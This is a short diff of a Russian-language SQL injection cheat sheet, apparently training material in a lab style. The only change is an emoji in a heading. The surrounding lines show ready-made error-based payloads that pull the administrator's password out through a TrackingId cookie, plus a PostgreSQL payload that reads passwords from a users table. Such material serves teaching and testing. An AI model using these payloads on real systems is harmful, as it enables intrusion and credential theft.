@@ -243,7 +243,7 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 
 ## 🧩 Шпаргалка: готовые инъекции для разных СУБД
 
-### 🎯 Получить пароль за 1 запрос (если ошибки показывают данные)
+###  ⚡ Получить пароль за 1 запрос (если ошибки показывают данные)
 
 ### PostgreSQL
 '||(SELECT password FROM users LIMIT 1)::int||'
